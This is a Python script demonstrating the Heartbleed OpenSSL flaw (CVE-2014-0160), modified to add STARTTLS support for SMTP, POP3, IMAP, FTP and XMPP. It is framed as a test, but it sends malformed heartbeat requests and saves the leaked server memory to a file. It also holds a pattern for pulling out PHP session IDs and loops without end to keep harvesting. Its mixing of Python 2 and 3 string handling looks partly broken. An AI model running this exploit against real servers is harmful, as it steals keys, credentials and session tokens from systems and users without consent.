#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford
# (jspenguin@jspenguin.org)

# Modified by Derek Callaway (decal@ethernet.org) to add STARTTLS protocols

# The authors disclaim copyright to this source code.
import codecs
import re
import select
import socket
import struct
import sys
import time
from optparse import OptionParser

options = OptionParser(
    usage='%prog server [options]',
    description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=4430,
                   help='TCP port to test (default: 4430)')
options.add_option('-s', '--starttls', type='string', default='',
                   help='STARTTLS protocol: smtp, pop3, imap, ftp, or xmpp')


def h2bin(x):
    mystr = x.replace(' ', '').replace('\n', '')
    result = codecs.decode(mystr, 'hex')
    return result


hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')


def p(data):
    user = '/PHPSESSID(.*?)\./'
    reg = re.compile(user)
    print(reg.findall(data))


key = ''


def hexdump(s):
    global key
    r = ''
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
        # print '  %04x: %-48s %s' % (b, hxdat, pdat)
        # print "%s" % pdat.strip(),
        r = r + pdat
    fi = r.replace('..', '').replace('ZZZZZ', '').replace('\.\.', '')
    print("%s" % fi)
    # p(r[:1500])
    if fi != key:
        f = open('result.txt', 'a')
        f.write(fi)
        f.close()
        key = fi
    # print


def recvall(s, length, timeout=4):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += str(data)
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    if (len(hdr) != 5):
        pass
    else:
        typ, ver, ln = struct.unpack('>BHH'.encode(), hdr.encode())
        pay = recvall(s, ln, 10)
        if pay is None:
            print('Unexpected EOF receiving record payload - server closed connection')
            return None, None, None
        print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
        return typ, ver, pay


def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False


BUFSIZ = 1024


def main():
    opts, args = options.parse_args()

    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('Connecting...')

    s.connect((args[0], opts.port))

    if opts.starttls != '':
        print('Sending STARTTLS Protocol Command...')

    if opts.starttls == 'smtp':
        s.recv(BUFSIZ)
        s.send("EHLO openssl.client.net\n".encode())
        s.recv(BUFSIZ)
        s.send("STARTTLS\n".encode())
        s.recv(BUFSIZ)

    if opts.starttls == 'pop3':
        s.recv(BUFSIZ)
        s.send("STLS\n".encode())
        s.recv(BUFSIZ)

    if opts.starttls == 'imap':
        s.recv(BUFSIZ)
        s.send("STARTTLS\n".encode())
        s.recv(BUFSIZ)

    if opts.starttls == 'ftp':
        s.recv(BUFSIZ)
        s.send("AUTH TLS\n".encode())
        s.recv(BUFSIZ)

    if opts.starttls == 'xmpp':  # TODO: This needs SASL
        s.send(
            "<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n".encode())
        s.recv(BUFSIZ)

    print('Sending Client Hello...')

    s.send(hello)

    print('Waiting for Server Hello...')

    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)


if __name__ == '__main__':
    try:
        while 1:
            main()
    except:
        time.sleep(5)
        while 1:
            main()
